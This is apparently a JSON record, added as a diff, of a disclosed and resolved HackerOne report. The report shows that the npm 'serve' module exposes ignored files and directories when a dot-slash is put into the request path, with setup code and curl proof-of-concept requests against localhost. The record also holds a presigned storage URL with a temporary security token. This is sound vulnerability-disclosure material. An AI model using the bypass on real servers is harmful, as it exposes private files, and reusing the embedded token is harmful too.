@@ -1,0 +1,201 @@
+{
+  "id": 330724,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA3MjQ=",
+  "url": "https://hackerone.com/reports/330724",
+  "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-28T10:35:21.237Z",
+  "submitted_at": "2018-03-28T10:35:21.237Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tungpun",
+    "url": "/tungpun",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5415"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-30T13:04:31.883Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-30T13:04:20.295Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a vulnerability in **serve**.\nIt allows listing directory and reading local files on the target server.\n\n# Module\n\n**module name:** serve\n**version:** 6.5.3\n**npm page:** `https://www.npmjs.com/package/serve`\n\n## Module Description\n\nEver wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.\n\nIn addition, it's also awesome when it comes to serving static sites!\n\n# Vulnerability\n\n## Steps To Reproduce:\n\n* Install serve:\n\n`$ npm i serve`\n\n* Create some child directories, files for demonstration:\n\n`$ mkdir dir`\n\n`$ echo \"This is secret content!!\" > dir/secret.txt`\n\n`$ mkdir dir/dir2`\n\n`$ touch dir/dir2/3.txt`\n\n* Create an application that uses `serve` for file serving listing and set a few folders and files in the ignore config.\n\n```\nconst serve = require('serve')\nconst server = serve(__dirname, {\n      port: 6060,\n      ignore: ['dir/secret.txt', 'dir/dir2']\n})\n```\n\n* Run the app\n\n`$ node app.js`\n\nNow, the current directory will be served by this module on port `6060` with the exception of file `dir/secret.txt` and directory `'dir/dir2`.\n\n* If we try to request these ignored files/directories, we get a Not Found error\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'\nNot Found\n```\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'\nNot Found\n```\n\nor if we replace `e` character with URI encoded form `%65`, it still be ignored:\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'\nNot Found\n```\n\n* However, I found a way to access that file by using dot-slash.\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'\nThis is secret content!!\n```\n\nOr listing the directory:\n\n`http://127.0.0.1:6060/dir/%2e%2fdir2/`\n\n{F279456}\n\n## Supporting Material/References:\n\n* macOS High Sierra 10.13.3\n* node v8.10.0\n* npm 5.8.0\n* Chrome Version 65.0.3325.162 (Official Build) (64-bit)\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n## Impact\n\nIt bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.",
+  "weakness": {
+    "id": 89,
+    "name": "Information Exposure Through Directory Listing"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 279456,
+      "file_name": "serve2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/456/a4e4c2e45fecafc065d60faaa25c8d2010083dcf/serve2.png?response-content-disposition=attachment%3B%20filename%3D%22serve2.png%22%3B%20filename%2A%3DUTF-8%27%27serve2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV327SCJW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T060542Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICcmLPAsz8aIJBxwFQKJqnVeDfAfWOdxk1IngSaMmeJzAiBKDG4l1%2Br3ISKFshX%2BkxPWdzB9VV7nQD5%2BwDSV08JosyqyBQh%2BEAMaDDAxMzYxOTI3NDg0OSIMk8nxC%2BTbLzjFAmp7Ko8FLPhdrVD4E2hhdx1Zb0Avw%2BCjLB4pldVIwFlS5yJrI%2FsMNqcGTSEsfN2z3npfnk5b41VkUd%2FFa%2BkaeCb1LFnYA7stTGDdTjV6yGnCvkfkYVBX8EAryen9284xVWqXeGHUmxxFI0gcd1xkdz4jJ12tYTbIwYDZYMVfOvsKWyzropj951clyEpv4fAeC1aqQY0NhqL2v%2FbWltEsawextFCV8SYQ62%2FLYIbbs1cauBq9sq3T2sWieTbDLsF8Omj1JnhqtMrsLqQHEdW7tre8R8f3PnDmYYjp5dOT7FS9yn6SSlyR8xqBvLLcGkCVa3lGp5E7SCc0gwJmQn5uxwgKQFuttvoFNo4a32Y%2BoExmqYS%2BFqUTtSRNE78FkN6khA5P4cVMYZWZfzETe5fg%2BzxUlm1wFTvyk6%2BNj17PTLh7F0Vt%2BTGiWNbUhDigUrSN2J1vU4DE3xTXc6ptkF5SQ58TTjHuzn1YZQv0dFvVzD12llG%2BUV1yE5saysqs5hdHyhS1HYiW%2Bof7oc3f5UG1awtxuVkVSp8pghtff1ZJYsAVDVTpBz%2BNno3y7RWsGWOLWKv%2B725EeW8X%2FCZ2Kwvq5XXNfFAYR8apF6HSpD7lEF2jT2%2B3SR2tlzwvX9xeLIbx1jEIiUjQFu2v7gxrkrkWcW3zdxJyqXT9WIisUx1gW0%2BARkC4vhl20H9Sd%2FPKalUv038Zad6BQ1WlNeQVe5j7OdmLxKvde6WfXedzvfZiWKBQNqPpPCjGoah0uXJqNBk2mHXJUj9n8%2FWgKah8apydmmnw2cg0k0tJO0HPWrSEbsDRJmxdCp0Kio5DLk%2B6t0eCP%2Bjvh6Gtaj5Yrk5uljEmhYKquzO51DpIKMs%2BskP3yHYGh8nsqjCKu7fSBjqyAT%2BOiaQSm12aJgcXkAfQB7ruWGzRbpU%2BgUFcUEnKAVAP%2FMojoxKMSYGyfUKghv%2F7n2F51f3XiUQqaiR8wFfdnrNGwRPQWWkNLMj%2F1bcYHmV1AS61piZp5M0yp2PSXyMqWaJXEPzNBF%2Fi9h8gQhG2jSDVyg8lBwqggatsLYEmxlPbUKcUx9B2giy1fY8qnQTMr1kI%2FNhE0UJgZErpIgRIqE3e5ZMxdZSMvo4xqCBV1dQrSVY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf7e3aa4ebe435797032c88e67995ac1f9eca53aed2c6f6bf6878fdc9c19c819",
+      "file_size": 281843,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-06-29T13:04:20.418Z",
+  "allow_singular_disclosure_after": -253213281.62506136,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "bl4de",
+    "eveeez"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5006,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "serve",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "330724",
+  "votes": 2,
+  "latest_disclosable_activity_at": "2018-05-30T13:04:31.767Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:05:42.155631",
+    "source": "https://hackerone.com/reports/330724.json",
+    "report_id": 330724
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA3MjQ=",
+    "databaseId": "330724",
+    "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
+    "url": "https://hackerone.com/reports/330724",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-05-30T13:04:31.883Z",
+    "created_at": "2018-03-28T10:35:21.237Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg5",
+      "name": "Information Exposure Through Directory Listing",
+      "external_id": "cwe-548"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.3
+    },
+    "reporter": {
+      "username": "tungpun"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMzMDcyNA==",
+    "_id": "330724",
+    "disclosed": true,
+    "votes": 2,
+    "latest_disclosable_activity_at": "2018-05-30T13:04:31.767Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA3MjQ=",
+      "databaseId": "330724",
+      "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
+      "url": "https://hackerone.com/reports/330724",
+      "disclosed_at": "2018-05-30T13:04:31.883Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    }
+  }
+}
